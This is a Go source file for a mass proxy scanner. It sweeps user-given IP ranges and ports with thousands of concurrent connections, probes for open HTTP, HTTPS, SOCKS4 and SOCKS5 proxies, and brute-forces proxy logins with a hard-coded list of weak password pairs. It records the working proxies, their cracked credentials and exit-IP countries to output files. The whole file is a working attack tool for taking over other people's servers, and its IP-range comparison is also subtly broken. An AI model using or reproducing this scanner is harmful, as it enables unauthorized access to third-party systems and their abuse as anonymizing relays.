package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/cheggaaa/pb/v3"
	"golang.org/x/net/proxy"
)

// ==================== 配置与常量 ====================
var (
	weakPasswords = [][2]string{
		{"admin", "admin"}, {"root", "root"}, {"user", "user"}, {"123", "123"},
		{"proxy", "proxy"}, {"socks5", "socks5"}, {"123456", "123456"}, {"test", "test"},
		{"guest", "guest"}, {"", "admin"}, {"admin", ""}, {"12345", "12345"},
		{"qwe123", "qwe123"}, {"abc123", "abc123"}, {"password", "password"},
		{"12349", "12349"}, {"socks", "socks"}, {"demo", "demo"}, {"fuckyou", "fuckyou"},
		{"1080", "1080"}, {"123", "321"}, {"1234", "4321"}, {"12345", "54321"},
		{"123456", "654321"}, {"12345678", "87654321"}, {"123456789", "987654321"},
		{"hello", "hello"}, {"qwerty", "qwerty"}, {"qwe", "asd"}, {"love", "love"},
		{"a", "a"}, {"aa", "aa"}, {"aaa", "aaa"}, {"111", "111"}, {"000", "000"},
		{"1", "1"}, {"2", "2"}, {"3", "3"}, {"4", "4"}, {"5", "5"}, {"6", "6"},
		{"7", "7"}, {"8", "8"}, {"9", "9"}, {"0", "0"}, {"qwq", "qwq"}, {"qaq", "qaq"},
		{"nmsl", "nmsl"}, {"69", "69"}, {"6969", "6969"}, {"wsnd", "wsnd"},
	}
	protocols     = []string{"http", "https", "socks4", "socks5"}
	countryCache  = sync.Map{}
	validCount    int64
	detailFile    *os.File
	validFile     *os.File
)

func main() {
	// 参数解析
	ipRange := flag.String("ip-range", "", "IP range: 192.168.1.1-192.168.1.255")
	portInput := flag.String("port", "1080", "Ports: 1080 / 80 8080 / 1-65535")
	threads := flag.Int("threads", 15000, "Max concurrent connections")
	timeout := flag.Duration("timeout", 5*time.Second, "Timeout per request")
	flag.Parse()

	if *ipRange == "" {
		fmt.Println("Error: -ip-range is required")
		flag.Usage()
		os.Exit(1)
	}

	// 解析 IP 和端口
	ips, err := parseIPRange(*ipRange)
	if err != nil {
		fmt.Printf("IP range error: %v\n", err)
		os.Exit(1)
	}
	ports, err := parsePorts(*portInput)
	if err != nil {
		fmt.Printf("Port error: %v\n", err)
		os.Exit(1)
	}

	candidates := make([]string, 0, len(ips)*len(ports))
	for _, ip := range ips {
		for _, port := range ports {
			candidates = append(candidates, fmt.Sprintf("%s:%d", ip, port))
		}
	}

	fmt.Printf("[*] IPs: %d, Ports: %d, Total: %d\n", len(ips), len(ports), len(candidates))
	fmt.Printf("[*] Threads: %d, Timeout: %v\n", *threads, *timeout)

	// 初始化输出文件
	detailFile, _ = os.OpenFile("result_detail.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	validFile, _ = os.OpenFile("proxy_valid.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	defer detailFile.Close()
	defer validFile.Close()

	fmt.Fprintln(detailFile, "# 全协议扫描详细日志")
	fmt.Fprintln(validFile, "# scheme://[user:pass@]ip:port#CC")

	// 进度条
	bar := pb.StartNew(len(candidates))
	bar.SetTemplate(`{{counters . }} {{bar . }} {{percent . }} {{etime . }}`)

	// 并发控制
	sem := make(chan struct{}, *threads)
	var wg sync.WaitGroup

	// 捕获中断
	ctx, cancel := context.WithCancel(context.Background())
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() { <-c; cancel(); bar.Finish() }()

	// 主循环
	for _, addr := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		go func(a string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem; bar.Increment() }()

			ip, portStr, _ := strings.Cut(a, ":")
			port, _ := strconv.Atoi(portStr)

			result := scanProxy(ctx, ip, port, *timeout)
			if result.Scheme != "" {
				atomic.AddInt64(&validCount, 1)
				writeResult(result)
			}
		}(addr)
	}

	wg.Wait()
	bar.Finish()
	fmt.Printf("\n[+] 完成！发现 %d 个代理 → proxy_valid.txt\n", validCount)
}

// ==================== 解析函数 ====================
func parseIPRange(r string) ([]string, error) {
	if strings.Contains(r, "/") {
		_, ipnet, err := net.ParseCIDR(r)
		if err != nil {
			return nil, err
		}
		var ips []string
		for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
			if !ipnet.IP.Equal(ip) {
				ips = append(ips, ip.String())
			}
		}
		return ips, nil
	}
	parts := strings.Split(r, "-")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid format")
	}
	start := net.ParseIP(parts[0]).To4()
	end := net.ParseIP(parts[1]).To4()
	if start == nil || end == nil {
		return nil, fmt.Errorf("invalid IP")
	}
	var ips []string
	for ip := start; compareIP(ip, end) <= 0; ip = incIP(ip) {
		ips = append(ips, ip.String())
	}
	return ips, nil
}

func parsePorts(input string) ([]int, error) {
	var ports []int
	parts := strings.Fields(input)
	for _, p := range parts {
		if strings.Contains(p, "-") {
			r := strings.Split(p, "-")
			s, _ := strconv.Atoi(r[0])
			e, _ := strconv.Atoi(r[1])
			for i := s; i <= e; i++ {
				ports = append(ports, i)
			}
		} else {
			port, _ := strconv.Atoi(p)
			ports = append(ports, port)
		}
	}
	return ports, nil
}

func incIP(ip net.IP) net.IP {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
	return ip
}

func compareIP(a, b net.IP) int {
	return strings.Compare(a.String(), b.String())
}

// ==================== 结果结构 ====================
type Result struct {
	IP        string
	Port      int
	Scheme    string
	Latency   int
	ExportIP  string
	Country   string
	Auth      string
	IsWeak    bool
}

// ==================== 主扫描逻辑 ====================
func scanProxy(ctx context.Context, ip string, port int, timeout time.Duration) Result {
	result := Result{IP: ip, Port: port}

	for _, scheme := range protocols {
		if ctx.Err() != nil {
			return result
		}

		// 1. 匿名测试
		ok, lat, exportIP := testProxy(ctx, scheme, ip, port, nil, timeout)
		if ok {
			result.Scheme = scheme
			result.Latency = lat
			result.ExportIP = exportIP
			result.Country = getCountry(exportIP)
			if result.Country == "XX" {
				result.Country = getCountry(ip)
			}
			return result
		}

		// 2. 弱密码爆破（仅 HTTP/HTTPS/SOCKS5）
		if scheme == "socks4" {
			continue
		}
		for _, pair := range weakPasswords {
			if ctx.Err() != nil {
				return result
			}
			auth := &proxy.Auth{User: pair[0], Password: pair[1]}
			ok, lat, exportIP := testProxy(ctx, scheme, ip, port, auth, timeout)
			if ok {
				result.Scheme = scheme
				result.Latency = lat
				result.ExportIP = exportIP
				result.Country = getCountry(exportIP)
				if result.Country == "XX" {
					result.Country = getCountry(ip)
				}
				result.Auth = fmt.Sprintf("%s:%s", pair[0], pair[1])
				result.IsWeak = true
				return result
			}
		}
	}
	return result
}

// ==================== 协议测试（修复 SOCKS4）===================
func testProxy(ctx context.Context, scheme, ip string, port int, auth *proxy.Auth, timeout time.Duration) (bool, int, string) {
	addr := fmt.Sprintf("%s:%d", ip, port)
	testURL := "http://ifconfig.me"

	var dialer func(ctx context.Context, network, address string) (net.Conn, error)

	switch scheme {
	case "http", "https":
		u := &url.URL{Scheme: "http", Host: addr}
		if auth != nil {
			u.User = url.UserPassword(auth.User, auth.Password)
		}
		d, err := proxy.FromURL(u, proxy.Direct)
		if err != nil {
			return false, 0, ""
		}
		dialer = d.(proxy.ContextDialer).DialContext
	case "socks5":
		d, err := proxy.SOCKS5("tcp", addr, auth, proxy.Direct)
		if err != nil {
			return false, 0, ""
		}
		dialer = d.(proxy.ContextDialer).DialContext
	case "socks4":
		dialer = socks4Dialer(addr, auth)
	default:
		return false, 0, ""
	}

	transport := &http.Transport{
		DialContext: dialer,
	}
	client := &http.Client{Transport: transport, Timeout: timeout}

	start := time.Now()
	req, _ := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	resp, err := client.Do(req)
	if err != nil {
		return false, 0, ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	exportIP := strings.TrimSpace(string(body))
	latency := int(time.Since(start).Milliseconds())

	return resp.StatusCode == 200 && isValidIP(exportIP), latency, exportIP
}

// 手动实现 SOCKS4 拨号（Go 官方已移除）
func socks4Dialer(addr string, auth *proxy.Auth) func(ctx context.Context, network, target string) (net.Conn, error) {
	return func(ctx context.Context, network, target string) (net.Conn, error) {
		d := net.Dialer{Timeout: 5 * time.Second}
		conn, err := d.DialContext(ctx, "tcp", addr)
		if err != nil {
			return nil, err
		}

		// SOCKS4 请求
		ip, portStr, _ := net.SplitHostPort(target)
		port, _ := strconv.Atoi(portStr)
		ipBytes := net.ParseIP(ip).To4()

		req := []byte{4, 1, byte(port >> 8), byte(port), ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3], 0}
		if auth != nil && auth.User != "" {
			req = append(req, []byte(auth.User)...)
			req = append(req, 0)
		}
		req = append(req, 0)

		if _, err := conn.Write(req); err != nil {
			conn.Close()
			return nil, err
		}

		resp := make([]byte, 8)
		if _, err := io.ReadFull(conn, resp); err != nil {
			conn.Close()
			return nil, err
		}

		if resp[0] != 0 || resp[1] != 90 {
			conn.Close()
			return nil, fmt.Errorf("socks4 rejected")
		}

		return conn, nil
	}
}

func isValidIP(s string) bool {
	return net.ParseIP(s) != nil
}

// ==================== 国家查询 ====================
func getCountry(ip string) string {
	if v, ok := countryCache.Load(ip); ok {
		return v.(string)
	}

	urls := []string{
		"http://ip-api.com/json/" + ip + "?fields=countryCode",
		"https://ipinfo.io/" + ip + "/country",
	}

	client := &http.Client{Timeout: 3 * time.Second}
	for _, u := range urls {
		resp, err := client.Get(u)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		code := ""
		if strings.Contains(u, "json") {
			var m map[string]interface{}
			if json.Unmarshal(body, &m) == nil {
				if c, ok := m["countryCode"].(string); ok {
					code = strings.ToUpper(c)
				}
			}
		} else {
			code = strings.TrimSpace(strings.ToUpper(string(body)))
		}
		if len(code) == 2 && regexp.MustCompile(`^[A-Z]{2}$`).MatchString(code) {
			countryCache.Store(ip, code)
			return code
		}
	}
	countryCache.Store(ip, "XX")
	return "XX"
}

// ==================== 输出 ====================
func writeResult(r Result) {
	// 详细日志
	status := "OK"
	if r.IsWeak {
		status = "OK (Weak)"
	}
	line := fmt.Sprintf("%s:%d | %s | %s | %s | %dms | %s | %s",
		r.IP, r.Port, r.Scheme, status, r.Country, r.Latency, r.ExportIP, r.Auth)
	fmt.Fprintln(detailFile, line)

	// 有效代理
	authPart := ""
	if r.Auth != "" {
		authPart = r.Auth + "@"
	}
	fmtStr := fmt.Sprintf("%s://%s%s:%d#%s", r.Scheme, authPart, r.IP, r.Port, r.Country)
	if authPart == "" {
		fmtStr = strings.Replace(fmtStr, "@:", ":", 1)
	}
	fmt.Fprintln(validFile, fmtStr)
}
